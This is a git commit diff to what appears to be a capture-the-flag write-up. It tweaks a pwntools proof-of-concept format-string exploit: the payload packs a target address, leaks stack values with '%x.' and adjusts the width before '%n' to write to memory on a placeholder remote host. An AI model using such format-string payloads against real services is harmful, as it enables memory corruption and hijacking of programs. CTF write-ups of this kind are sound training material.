e6d0f371c2aa2f023f05cb9690d1a68029fed90a
Maksim Zakharov <46570641+spl4ff@users.noreply.github.com>
2024-04-01 12:43:54 +0300

    Update poc.py

--- writeups/pwn/sick format/orgs/poc.py
+++ writeups/pwn/sick format/orgs/poc.py
@@ -3,7 +3,7 @@ from pwn import *
 
 conn = remote('IP', PORT)
 
-payload = '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%189d' + '%n'
+payload = '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%28d' + '%n'
 
 conn.sendline(payload)
 print(conn.recv()) 
